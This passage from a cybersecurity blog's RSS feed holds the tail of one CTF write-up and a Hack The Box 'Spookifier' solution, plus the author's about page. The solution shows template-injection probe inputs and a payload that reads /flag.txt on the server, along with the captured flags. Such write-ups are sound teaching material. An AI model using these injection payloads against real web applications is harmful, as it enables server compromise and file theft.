&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;({&lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;})});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got the flag:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{sw1tch_stat3m3nts_4r3_vuln3r4bl3!!!}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;spookifier&#34;&gt;Spookifier&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There&amp;rsquo;s a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;solution-3&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;First thing i did is try Server Side Template Injection, which allows RCE. Even if you are not sure from the source code whether it is vulnerable, you could try fuzzing in a few inputs. I tried &lt;code&gt;{{5*5}}&lt;/code&gt;, &lt;code&gt;{5*5}&lt;/code&gt; and &lt;code&gt;${5*5}&lt;/code&gt; and found that &lt;code&gt;${5*5}&lt;/code&gt; worked to display 25 on the webpage!&lt;/p&gt;
&lt;p&gt;Perfect, now all we need to do is to read the flag with the payload &lt;code&gt;${open(&amp;quot;/flag.txt&amp;quot;).read()}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The Flag:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
    <item>
      <title></title>
      <link>https://mychaos.me/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://mychaos.me/about/</guid>
      <description>Hi there My name is Mohsine El Hadaoui and I&amp;rsquo;m a cybersecurity enthusiast. I&amp;rsquo;m from Morocco, living in Sidi Bennour, top 1% on TryHackMe and I&amp;rsquo;m a Computer Science student at 1337.
What is this blog about? I will be posting about my journey in cybersecurity, and I will be sharing some writeups of the CTFs I&amp;rsquo;ve done.
you can find me :
 Linkedin Github  So, there you have it&amp;hellip; enjoy!</description>
      <content>&lt;h1 id=&#34;hi-there&#34;&gt;Hi there&lt;/h1&gt;
&lt;p&gt;My name is Mohsine El Hadaoui and I&amp;rsquo;m a cybersecurity enthusiast. I&amp;rsquo;m from Morocco, living in Sidi Bennour, top 1% on &lt;a href=&#34;https://tryhackme.com/p/m0hs1ne&#34;&gt;TryHackMe&lt;/a&gt; and I&amp;rsquo;m a Computer Science student at &lt;a href=&#34;https://1337.ma&#34;&gt;1337&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;what-is-this-blog-about&#34;&gt;What is this blog about?&lt;/h1&gt;
&lt;p&gt;I will be posting about my journey in cybersecurity, and I will be sharing some writeups of the CTFs I&amp;rsquo;ve done.&lt;/p&gt;
&lt;p&gt;you can find me :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.linkedin.com/in/mohsine-el-hadaoui-92937222b/&#34;&gt;Linkedin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.github.com/m0hs1ne&#34;&gt;Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, there you have it&amp;hellip; enjoy!&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
